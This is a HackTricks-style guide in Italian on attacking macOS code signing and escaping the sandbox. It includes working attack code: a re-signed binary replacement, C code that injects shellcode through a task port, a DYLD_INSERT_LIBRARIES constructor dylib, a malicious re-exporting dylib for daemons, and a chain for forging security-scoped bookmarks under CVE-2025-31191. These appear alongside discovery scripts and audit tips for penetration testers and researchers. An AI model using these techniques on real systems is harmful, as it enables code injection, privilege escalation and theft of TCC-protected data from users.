# Weaknesses del Code Signing di macOS e Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Binaries con firma Ad-Hoc

### Informazioni di base

La **firma ad-hoc** (`CS_ADHOC`) crea una code signature **senza certificate chain**. Esegue comunque l'hashing del codice firmato, quindi la validazione può rilevare modifiche, ma non fornisce alcuna developer identity che un altro componente possa autenticare. Sostituire e firmare nuovamente l'eseguibile produce un CodeDirectory/CDHash diverso.<sup>[[1]](#references)[[4]](#references)</sup>

Sui Mac con Apple Silicon, tutti gli eseguibili richiedono almeno una firma ad-hoc. Ciò significa che troverai firme ad-hoc su molti development tool, package Homebrew e utility di terze parti.

### Perché è importante

- **Nessuna signer identity verificabile** — i controlli che accettano solo un path, uno stato ad-hoc o un identifier non vincolato non possono stabilire chi ha prodotto il binary.
- I binary ad-hoc di terze parti in **posizioni privilegiate** (FDA, daemon, helper) sono target prioritari quando il loro file o una parent directory è scrivibile.
- Un controllo TCC basato su CDHash, designated-requirement o requirement **rileva** la sostituzione. Una policy basata sul path potrebbe non rilevarla; esamina il requirement effettivo e ripeti il test del grant invece di presumere che sopravviva alla nuova firma.

### Scoperta
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attacco: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Processi sottoponibili a debug (get-task-allow)

### Informazioni di base

L'entitlement **`com.apple.security.get-task-allow`** (o flag `CS_GET_TASK_ALLOW`) consente a un debugger autorizzato di ottenere la task port del processo anche quando Hardened Runtime normalmente lo impedirebbe. Un debugger che riesca nell'operazione può leggere la memoria, modificare i registri, iniettare codice e controllare l'esecuzione.<sup>[[3]](#references)</sup>

Questo è previsto **solo per le build di sviluppo**. Tuttavia, alcuni binari di terze parti vengono distribuiti in produzione con questo entitlement.

> [!CAUTION]
> Un binario di produzione con `get-task-allow` è una potente primitiva di exploitation. `taskgated`, l'identità del chiamante, il sandboxing, gli entitlement del debugger e l'autorizzazione Developer Tools continuano a determinare se un particolare client può ottenere la task port; esegui test con `lldb`/`debugserver` e con l'injector previsto. Una volta riuscito l'attach, il codice iniettato viene eseguito con gli entitlement, i permessi TCC e il contesto di sicurezza del target.

### Individuazione
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Nessuna validazione delle librerie + ambiente DYLD

### Rimozione della validazione delle librerie a runtime

L'entitlement privato **`com.apple.private.security.clear-library-validation`** non disabilita la validazione delle librerie all'avvio del processo. Consente invece al processo di chiamare `csops(..., CS_OPS_CLEAR_LV, ...)` su se stesso durante l'esecuzione. XNU cancella quindi `CS_REQUIRE_LV | CS_FORCED_LV`, a condizione che il chiamante disponga dell'entitlement e soddisfi i controlli aggiuntivi dell'handler. Di conseguenza, un processo può diventare un target valido per la library injection solo dopo aver raggiunto il code path che cancella la validazione delle librerie.<sup>[[4]](#references)[[5]](#references)</sup>

### La combinazione letale

Quando un binary presenta **entrambi**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (carica qualsiasi dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accetta le variabili d'ambiente DYLD)

Questa è una combinazione di grande valore per il code injection, perché Hardened Runtime consente sia la libreria non trusted sia la variabile d'ambiente DYLD. Il contesto di avvio può comunque ripulire le variabili DYLD (ad esempio nei percorsi di esecuzione protetti o privilegiati); verifica quindi l'invocazione esatta invece di considerare la coppia di entitlement come incondizionata.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attacco: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Eccezioni temporanee del Sandbox

### Come indeboliscono il Sandbox

Le eccezioni temporanee del Sandbox (`com.apple.security.temporary-exception.*`) creano falle nell'App Sandbox:<sup>[[2]](#references)</sup>

| Eccezione | Cosa consente |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Connettersi a servizi XPC/Mach a livello di sistema |
| `temporary-exception.files.absolute-path.read-write` | Leggere/scrivere file al di fuori del container dell'app |
| `temporary-exception.iokit-user-client-class` | Aprire connessioni IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Leggere le preferenze di altre app |
| `temporary-exception.files.home-relative-path.read-write` | Accedere ai percorsi relativi a `~` |

### Eccezioni Mach-Lookup = Sandbox Escape Primitive

L'eccezione più pericolosa è **mach-lookup**: consente a un'app in Sandbox di comunicare con daemon privilegiati:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attacco: Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## I controlli di Code-Signing non garantiscono l'integrità del client XPC

Un servizio XPC può autenticare una connessione estraendo lo stato del code-signing dal proprio audit token e accettando un **platform binary** Apple o un client con `CS_REQUIRE_LV`/`CS_FORCED_LV`. Questi test descrivono l'eseguibile e determinati flag del processo; non dimostrano che l'address space corrente contenga esclusivamente codice trusted. La ricerca sui servizi ImageCapture ha dimostrato che un binary Apple iniettabile come `/bin/ls` poteva caricare una dylib dell'attaccante tramite `DYLD_INSERT_LIBRARIES` e poi connettersi come platform client. Anche un controllo successivo dei flag di library-validation è stato bypassato, prima che Apple modificasse il servizio per richiedere il proprio private authorization entitlement in macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Eseguire il reverse di `listener:shouldAcceptNewConnection:` (o dell'equivalente low-level XPC handler) e identificare le decisioni basate esclusivamente su `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` o `CS_FORCED_LV`.
2. Enumerare i client Apple-signed in grado di parlare il protocollo, quindi esaminare Hardened Runtime ed entitlements. Una platform signature da sola non dimostra che l'iniezione tramite DYLD sia bloccata.
3. Testare il candidato sulla **target macOS build**. Se viene caricata una constructor dylib, effettuare la connessione al servizio da quella constructor, in modo che l'audit token appartenga al platform process accettato.
4. Ripetere il test per ogni vendor patch: aggiungere un altro mutable process-status flag alla stessa decisione di autorizzazione potrebbe non rimuovere la confused-deputy primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Il comportamento di DYLD, la policy di AMFI e i controlli lato service cambiano tra le diverse release di macOS. Un fallimento contro un host completamente aggiornato non dimostra che la stessa chain sia fallita nella release vulnerabile.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

I security-scoped bookmark persistono la scelta di un file effettuata dall'utente tra i diversi avvii. Una sandbox extension è vincolata al boot, quindi `ScopedBookmarkAgent` la convalida e crea un bookmark di lunga durata autenticato tramite HMAC; quando l'app presenta successivamente quel bookmark, l'agent lo convalida e rilascia una nuova sandbox extension. Il signing secret è memorizzato nel login keychain e una chiave per-app viene derivata usando il bundle identifier.<sup>[[7]](#references)</sup>

Nei sistemi interessati, l'ACL del keychain impediva a un processo non trusted di **leggere** il secret di `com.apple.scopedbookmarksagent.xpc`, ma non ne impediva l'eliminazione. Un'app sandboxed compromessa poteva sostituire l'item con un secret noto e un ACL controllato dall'attacker, derivare la chiave HMAC specifica dell'app, forgiare entry nel bookmark plist del container scrivibile e chiedere a `ScopedBookmarkAgent` di scambiarle con estensioni per l'accesso ai file. Questo trasformava qualsiasi applicazione sandboxed che utilizzasse security-scoped bookmark in una potenziale sandbox escape con accesso arbitrario ai file, senza un'ulteriore interazione con il file picker. Apple ha risolto il problema negli aggiornamenti di sicurezza del 31 marzo 2025.<sup>[[7]](#references)</sup>

### Triage e Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
La sequenza di exploitation su un host vulnerabile è:

1. Ottenere code execution all'interno di un'app in sandbox che utilizza persistent scoped bookmarks.
2. Sostituire l'elemento di firma del keychain dell'agent con un secret noto e un ACL permissivo.
3. Calcolare `HMAC-SHA256(key=known_secret, data=bundle_id)` e forgiare un bookmark per un path utile nello store dei bookmark scrivibile dall'app.
4. Attivare il normale percorso di risoluzione dei bookmark dell'applicazione, in modo che `ScopedBookmarkAgent` restituisca una sandbox extension.
5. Utilizzare il nuovo accesso ai file per sovrascrivere un target di esecuzione o dati out-of-sandbox disponibile per quell'utente.

Questa è una **tecnica per versioni patchate**: utilizzala per comprendere il trust boundary e valutare sistemi non patchati, non come presupposto sulle release attuali. Per i test correnti, concentrati sul parsing dei bookmark, sull'associazione dell'identità, sul ciclo di vita del keychain-item e sul comportamento da confused deputy attorno all'agent.

---

## Entitlements privati di Apple

### Cosa sono

Gli entitlements con prefisso `com.apple.private.*` forniscono accesso ad **API interne di Apple** non documentate o disponibili agli sviluppatori di terze parti. I binary di terze parti con private entitlements li ottenevano tramite enterprise cert, MDM o distribuzione non App Store.

### Private Entitlements pericolosi

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Lettura/scrittura completa del database TCC |
| `com.apple.private.tcc.allow` | Accesso a specifici servizi TCC |
| `com.apple.private.security.no-sandbox` | Esecuzione senza sandbox |
| `com.apple.private.iokit` | Accesso diretto ai driver IOKit |
| `com.apple.private.kernel.\*` | Accesso all'interfaccia del kernel |
| `com.apple.private.xpc.launchd.job-label` | Registrazione/gestione dei job launchd |
| `com.apple.rootless.install` | Scrittura nei path protetti da SIP |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Profili Sandbox personalizzati (SBPL)

### Cosa sono

I binari possono includere **profili sandbox personalizzati** scritti in SBPL (Seatbelt Profile Language). Questi profili possono essere più restrittivi OPPURE **più permissivi** rispetto all'App Sandbox predefinito.

### Auditing dei profili personalizzati
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Percorsi delle librerie scrivibili

### Cosa sono

Quando un binary carica una dynamic library da un percorso in cui l'utente corrente può **scrivere**, la libreria può essere sostituita con codice malevolo.

### Individuazione
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Guida alla firma del codice](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operazioni `CS_OPS_*` e `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Una nuova era dei sandbox escapes su macOS: analisi di una attack surface trascurata e scoperta di oltre 10 nuove vulnerabilità](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Analisi di CVE-2025-31191: un sandbox escape su macOS basato sui security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
